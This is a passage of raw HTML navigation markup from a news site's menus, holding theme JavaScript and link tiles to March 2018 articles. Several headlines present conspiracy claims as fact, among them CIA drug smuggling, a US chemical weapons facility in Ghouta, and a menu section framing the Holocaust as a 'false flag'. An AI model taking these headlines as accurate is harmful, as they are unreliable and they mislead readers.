<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/gop-caught-in-facebook-election-rigging-plot/" rel="bookmark" title="Not Russia! GOP Caught in Facebook Election Rigging Plot"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-27-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-27-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-27-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Not Russia! GOP Caught in Facebook Election Rigging Plot" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div> <a href="https://www.veteranstoday.com/category/government-and-politics/corruption/" class="td-post-category">Corruption</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/gop-caught-in-facebook-election-rigging-plot/" rel="bookmark" title="Not Russia! GOP Caught in Facebook Election Rigging Plot">Not Russia! GOP Caught in Facebook Election Rigging Plot</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/splc-fake-extremist-monitor-exposed-as-mob-smear-machine/" rel="bookmark" title="SPLC: Fake &#8220;Extremist Monitor&#8221; Exposed as Mob &#8220;Smear Machine"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/5aab3d36fc7e937b768b45e9-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/5aab3d36fc7e937b768b45e9-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/5aab3d36fc7e937b768b45e9-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="SPLC: Fake &#8220;Extremist Monitor&#8221; Exposed as Mob &#8220;Smear Machine" /></a></div> <a href="https://www.veteranstoday.com/category/government-and-politics/corruption/" class="td-post-category">Corruption</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/splc-fake-extremist-monitor-exposed-as-mob-smear-machine/" rel="bookmark" title="SPLC: Fake &#8220;Extremist Monitor&#8221; Exposed as Mob &#8220;Smear Machine">SPLC: Fake &#8220;Extremist Monitor&#8221; Exposed as Mob &#8220;Smear Machine</a></h3> </div>
</div>
</div></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_2_5aaf778c0f959" data-td_block_id="td_uid_2_5aaf778c0f959" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_2_5aaf778c0f959" data-td_block_id="td_uid_2_5aaf778c0f959" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> </div></div></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-464558"><a href="https://www.veteranstoday.com/category/false-flag-investigations/">Investigations</a>
<ul class="sub-menu">
<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><div class="td_block_wrap td_block_mega_menu td_uid_9_5aaf778c13072_rand td_with_ajax_pagination td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_9_5aaf778c13072"><script>var block_td_uid_9_5aaf778c13072 = new tdBlock();
block_td_uid_9_5aaf778c13072.id = "td_uid_9_5aaf778c13072";
block_td_uid_9_5aaf778c13072.atts = '{"limit":4,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"35707","category_ids":"","custom_title":"","custom_url":"","show_child_cat":30,"sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":3,"td_ajax_preloading":"","td_ajax_filter_type":"td_category_ids_filter","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_9_5aaf778c13072_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_9_5aaf778c13072_rand","tdc_css_class_style":"td_uid_9_5aaf778c13072_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_9_5aaf778c13072.td_column_number = "3";
block_td_uid_9_5aaf778c13072.block_type = "td_block_mega_menu";
block_td_uid_9_5aaf778c13072.post_count = "4";
block_td_uid_9_5aaf778c13072.found_posts = "2097";
block_td_uid_9_5aaf778c13072.header_color = "";
block_td_uid_9_5aaf778c13072.ajax_pagination_infinite_stop = "";
block_td_uid_9_5aaf778c13072.max_num_pages = "525";
tdBlocksArray.push(block_td_uid_9_5aaf778c13072);
</script><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_9_5aaf778c13072" id="td_uid_10_5aaf778c13b6f" data-td_block_id="td_uid_9_5aaf778c13072" data-td_filter_value="" href="https://www.veteranstoday.com/category/false-flag-investigations/">All</a><a class="mega-menu-sub-cat-td_uid_9_5aaf778c13072" id="td_uid_11_5aaf778c13c08" data-td_block_id="td_uid_9_5aaf778c13072" data-td_filter_value="22" href="https://www.veteranstoday.com/category/false-flag-investigations/911-and-terror-war/">9/11</a><a class="mega-menu-sub-cat-td_uid_9_5aaf778c13072" id="td_uid_12_5aaf778c13ca4" data-td_block_id="td_uid_9_5aaf778c13072" data-td_filter_value="35777" href="https://www.veteranstoday.com/category/false-flag-investigations/holocaust-false-flags/">Holocaust</a><a class="mega-menu-sub-cat-td_uid_9_5aaf778c13072" id="td_uid_13_5aaf778c13d3c" data-td_block_id="td_uid_9_5aaf778c13072" data-td_filter_value="35709" href="https://www.veteranstoday.com/category/false-flag-investigations/jfk/">JFK Assassination</a><a class="mega-menu-sub-cat-td_uid_9_5aaf778c13072" id="td_uid_14_5aaf778c13dd4" data-td_block_id="td_uid_9_5aaf778c13072" data-td_filter_value="35708" href="https://www.veteranstoday.com/category/false-flag-investigations/paris-attacks-2015/">Paris Attacks 2015</a><a class="mega-menu-sub-cat-td_uid_9_5aaf778c13072" id="td_uid_15_5aaf778c13e6b" data-td_block_id="td_uid_9_5aaf778c13072" data-td_filter_value="62981" href="https://www.veteranstoday.com/category/false-flag-investigations/gordon-duff-files/">The Gordon Duff Files</a></div></div><div id=td_uid_9_5aaf778c13072 class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/never-underestimate-the-cia/" rel="bookmark" title="Never underestimate the CIA"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/62163-218x150.jpeg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/62163-218x150.jpeg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/62163-100x70.jpeg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Never underestimate the CIA" /></a></div> <a href="https://www.veteranstoday.com/category/false-flag-investigations/" class="td-post-category">Investigations</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/never-underestimate-the-cia/" rel="bookmark" title="Never underestimate the CIA">Never underestimate the CIA</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/pravda-c-i-a-increases-drug-smuggling-in-afghanistan-to-fund-proxies-all-over-the-world/" rel="bookmark" title="Pravda: C.I.A. Increases Drug Smuggling in Afghanistan To Fund Proxies All Over the World"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/62157-218x150.jpeg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/62157-218x150.jpeg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/62157-100x70.jpeg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Pravda: C.I.A. Increases Drug Smuggling in Afghanistan To Fund Proxies All Over the World" /></a></div> <a href="https://www.veteranstoday.com/category/false-flag-investigations/" class="td-post-category">Investigations</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/pravda-c-i-a-increases-drug-smuggling-in-afghanistan-to-fund-proxies-all-over-the-world/" rel="bookmark" title="Pravda: C.I.A. Increases Drug Smuggling in Afghanistan To Fund Proxies All Over the World">Pravda: C.I.A. Increases Drug Smuggling in Afghanistan To Fund Proxies All&#8230;</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/it-wasnt-russia/" rel="bookmark" title="It Wasn&#8217;t Russia!"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Salisbury-01-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Salisbury-01-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Salisbury-01-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Salisbury-01-534x371.jpg 534w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="It Wasn&#8217;t Russia!" /></a></div> <a href="https://www.veteranstoday.com/category/false-flag-investigations/" class="td-post-category">Investigations</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/it-wasnt-russia/" rel="bookmark" title="It Wasn&#8217;t Russia!">It Wasn&#8217;t Russia!</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/15/screw-you-trump-photos-of-us-chemical-weapons-facility-in-ghouta/" rel="bookmark" title="Screw You Trump: Photos of US Chemical Weapons Facility in Ghouta"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-506-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-506-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-506-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Screw You Trump: Photos of US Chemical Weapons Facility in Ghouta" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div> <a href="https://www.veteranstoday.com/category/false-flag-investigations/" class="td-post-category">Investigations</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/15/screw-you-trump-photos-of-us-chemical-weapons-facility-in-ghouta/" rel="bookmark" title="Screw You Trump: Photos of US Chemical Weapons Facility in Ghouta">Screw You Trump: Photos of US Chemical Weapons Facility in Ghouta</a></h3> </div>
</div>
</div></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_9_5aaf778c13072" data-td_block_id="td_uid_9_5aaf778c13072" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_9_5aaf778c13072" data-td_block_id="td_uid_9_5aaf778c13072" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> </div></div></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-467379"><a href="https://www.veteranstoday.com/category/life/">Life</a>
<ul class="sub-menu">
<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><div class="td_block_wrap td_block_mega_menu td_uid_16_5aaf778c15f17_rand td_with_ajax_pagination td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_16_5aaf778c15f17"><script>var block_td_uid_16_5aaf778c15f17 = new tdBlock();
block_td_uid_16_5aaf778c15f17.id = "td_uid_16_5aaf778c15f17";
block_td_uid_16_5aaf778c15f17.atts = '{"limit":4,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"36","category_ids":"","custom_title":"","custom_url":"","show_child_cat":30,"sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":3,"td_ajax_preloading":"","td_ajax_filter_type":"td_category_ids_filter","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_16_5aaf778c15f17_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_16_5aaf778c15f17_rand","tdc_css_class_style":"td_uid_16_5aaf778c15f17_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_16_5aaf778c15f17.td_column_number = "3";
block_td_uid_16_5aaf778c15f17.block_type = "td_block_mega_menu";
block_td_uid_16_5aaf778c15f17.post_count = "4";
block_td_uid_16_5aaf778c15f17.found_posts = "4097";
block_td_uid_16_5aaf778c15f17.header_color = "";
block_td_uid_16_5aaf778c15f17.ajax_pagination_infinite_stop = "";
block_td_uid_16_5aaf778c15f17.max_num_pages = "1025";
tdBlocksArray.push(block_td_uid_16_5aaf778c15f17);
</script><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_17_5aaf778c16c8f" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="" href="https://www.veteranstoday.com/category/life/">All</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_18_5aaf778c16d1b" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="192" href="https://www.veteranstoday.com/category/life/art-music-entertainment/">A &amp; E</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_19_5aaf778c16db8" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="42026" href="https://www.veteranstoday.com/category/life/peace/">Activism</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_20_5aaf778c16e50" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="12092" href="https://www.veteranstoday.com/category/life/education-economy/">Education</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_21_5aaf778c16ee8" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="3521" href="https://www.veteranstoday.com/category/life/environment-of-interest-family/">Environment</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_22_5aaf778c16f7f" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="4243" href="https://www.veteranstoday.com/category/life/family/">Family</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_23_5aaf778c17015" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="9059" href="https://www.veteranstoday.com/category/life/food-wine-travel/">Food, Wine &amp; Travel</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_24_5aaf778c170ab" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="15" href="https://www.veteranstoday.com/category/life/medical-and-health/">Health</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_25_5aaf778c17141" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="13" href="https://www.veteranstoday.com/category/life/medical-and-health/ptsd-and-coping/">Coping</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_26_5aaf778c171f1" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="308" href="https://www.veteranstoday.com/category/life/medical-and-health/post-traumatic-stress-disorder-ptsd/">PTSD</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_27_5aaf778c172a7" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="42025" href="https://www.veteranstoday.com/category/life/money/">Money</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_28_5aaf778c1733d" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="71468" href="https://www.veteranstoday.com/category/life/new-world-order/">NWO Report</a><a class="mega-menu-sub-cat-td_uid_16_5aaf778c15f17" id="td_uid_29_5aaf778c173d1" data-td_block_id="td_uid_16_5aaf778c15f17" data-td_filter_value="7280" href="https://www.veteranstoday.com/category/life/religion-faith/">Religion &amp; Philosophy</a></div></div><div id=td_uid_16_5aaf778c15f17 class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/should-you-buy-a-gun-a-guide/" rel="bookmark" title="Should You Buy a Gun? – A Guide"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/IMGP0844-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/IMGP0844-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/IMGP0844-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Should You Buy a Gun? – A Guide" /></a></div> <a href="https://www.veteranstoday.com/category/life/" class="td-post-category">Life</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/should-you-buy-a-gun-a-guide/" rel="bookmark" title="Should You Buy a Gun? – A Guide">Should You Buy a Gun? – A Guide</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/your-success-and-leaps-of-faith-an-awakened-journey-towards-enlightenment-series/" rel="bookmark" title="Your Success and Leaps of Faith, an Awakened Journey Towards Enlightenment series"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/il_570xN.551638411_f3cq-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/il_570xN.551638411_f3cq-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/il_570xN.551638411_f3cq-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Your Success and Leaps of Faith, an Awakened Journey Towards Enlightenment series" /></a></div> <a href="https://www.veteranstoday.com/category/life/" class="td-post-category">Life</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/your-success-and-leaps-of-faith-an-awakened-journey-towards-enlightenment-series/" rel="bookmark" title="Your Success and Leaps of Faith, an Awakened Journey Towards Enlightenment series">Your Success and Leaps of Faith, an Awakened Journey Towards Enlightenment&#8230;</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/6-reasons-why-francis-is-not-the-biblical-false-prophet/" rel="bookmark" title="6 Reasons Why Francis Is Not the Biblical False Prophet"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/1-12-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/1-12-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/1-12-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="6 Reasons Why Francis Is Not the Biblical False Prophet" /></a></div> <a href="https://www.veteranstoday.com/category/life/" class="td-post-category">Life</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/6-reasons-why-francis-is-not-the-biblical-false-prophet/" rel="bookmark" title="6 Reasons Why Francis Is Not the Biblical False Prophet">6 Reasons Why Francis Is Not the Biblical False Prophet</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/million-a-week-club-your-rad-this-week-week-9/" rel="bookmark" title="MILLION A WEEK CLUB &#8211; Your Rad this Week &#8211; Week 9"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/nuke-radiation-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/nuke-radiation-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/nuke-radiation-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="MILLION A WEEK CLUB &#8211; Your Rad this Week &#8211; Week 9" /></a></div> <a href="https://www.veteranstoday.com/category/life/environment-of-interest-family/" class="td-post-category">Environment</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/million-a-week-club-your-rad-this-week-week-9/" rel="bookmark" title="MILLION A WEEK CLUB &#8211; Your Rad this Week &#8211; Week 9">MILLION A WEEK CLUB &#8211; Your Rad this Week &#8211; Week&#8230;</a></h3> </div>
</div>
</div></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_16_5aaf778c15f17" data-td_block_id="td_uid_16_5aaf778c15f17" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_16_5aaf778c15f17" data-td_block_id="td_uid_16_5aaf778c15f17" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> </div></div></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-466628"><a href="https://www.veteranstoday.com/category/armed-forces/">Military</a>
<ul class="sub-menu">
<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><div class="td_block_wrap td_block_mega_menu td_uid_30_5aaf778c190fb_rand td-no-subcats td_with_ajax_pagination td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_30_5aaf778c190fb"><script>var block_td_uid_30_5aaf778c190fb = new tdBlock();
block_td_uid_30_5aaf778c190fb.id = "td_uid_30_5aaf778c190fb";
block_td_uid_30_5aaf778c190fb.atts = '{"limit":"5","sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"28","category_ids":"","custom_title":"","custom_url":"","show_child_cat":30,"sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":3,"td_ajax_preloading":"","td_ajax_filter_type":"td_category_ids_filter","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_30_5aaf778c190fb_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_30_5aaf778c190fb_rand","tdc_css_class_style":"td_uid_30_5aaf778c190fb_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_30_5aaf778c190fb.td_column_number = "3";
block_td_uid_30_5aaf778c190fb.block_type = "td_block_mega_menu";
block_td_uid_30_5aaf778c190fb.post_count = "5";
block_td_uid_30_5aaf778c190fb.found_posts = "1258";
block_td_uid_30_5aaf778c190fb.header_color = "";
block_td_uid_30_5aaf778c190fb.ajax_pagination_infinite_stop = "";
block_td_uid_30_5aaf778c190fb.max_num_pages = "252";
tdBlocksArray.push(block_td_uid_30_5aaf778c190fb);
</script><div id=td_uid_30_5aaf778c190fb class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/19/nuclear-powered-anti-missile-system-what-russias-combat-laser-may-be-used-for/" rel="bookmark" title="Nuclear-Powered Anti-Missile System? What Russia&#8217;s Combat Laser May Be Used For"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-515-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-515-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-515-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Nuclear-Powered Anti-Missile System? What Russia&#8217;s Combat Laser May Be Used For" /></a></div> <a href="https://www.veteranstoday.com/category/armed-forces/" class="td-post-category">Military</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/19/nuclear-powered-anti-missile-system-what-russias-combat-laser-may-be-used-for/" rel="bookmark" title="Nuclear-Powered Anti-Missile System? What Russia&#8217;s Combat Laser May Be Used For">Nuclear-Powered Anti-Missile System? What Russia&#8217;s Combat Laser May Be Used For</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/new-russian-missiles-putin/" rel="bookmark" title="New Russian Missiles:  West makes Putin sick"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-28-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-28-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-28-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="New Russian Missiles:  West makes Putin sick" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div> <a href="https://www.veteranstoday.com/category/armed-forces/" class="td-post-category">Military</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/new-russian-missiles-putin/" rel="bookmark" title="New Russian Missiles:  West makes Putin sick">New Russian Missiles: West makes Putin sick</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/us-commissions-1-nuclear-sub-russia-3/" rel="bookmark" title="US Commissions 1 Nuclear Sub, Russia 3"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/1059220686-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/1059220686-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/1059220686-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="US Commissions 1 Nuclear Sub, Russia 3" /></a></div> <a href="https://www.veteranstoday.com/category/armed-forces/" class="td-post-category">Military</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/us-commissions-1-nuclear-sub-russia-3/" rel="bookmark" title="US Commissions 1 Nuclear Sub, Russia 3">US Commissions 1 Nuclear Sub, Russia 3</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/14/ads-vt-dubai-police-considers-blimp-in-fresh-strategy-to-help-fight-crime-without-police-officers/" rel="bookmark" title="ADS/VT: Dubai police considers blimp in fresh strategy to help fight crime &#8216;without police officers&#8217;"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-502-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-502-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-502-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="ADS/VT: Dubai police considers blimp in fresh strategy to help fight crime &#8216;without police officers&#8217;" /></a></div> <a href="https://www.veteranstoday.com/category/armed-forces/" class="td-post-category">Military</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/14/ads-vt-dubai-police-considers-blimp-in-fresh-strategy-to-help-fight-crime-without-police-officers/" rel="bookmark" title="ADS/VT: Dubai police considers blimp in fresh strategy to help fight crime &#8216;without police officers&#8217;">ADS/VT: Dubai police considers blimp in fresh strategy to help fight crime &#8216;without&#8230;</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/13/russias-pantsir-air-defense-system-may-go-hypersonic/" rel="bookmark" title="Russia&#8217;s Pantsir Air Defense System May Go Hypersonic"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/1046170188-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/1046170188-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/1046170188-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Russia&#8217;s Pantsir Air Defense System May Go Hypersonic" /></a></div> <a href="https://www.veteranstoday.com/category/armed-forces/" class="td-post-category">Military</a> </div>
<div class="item-details">
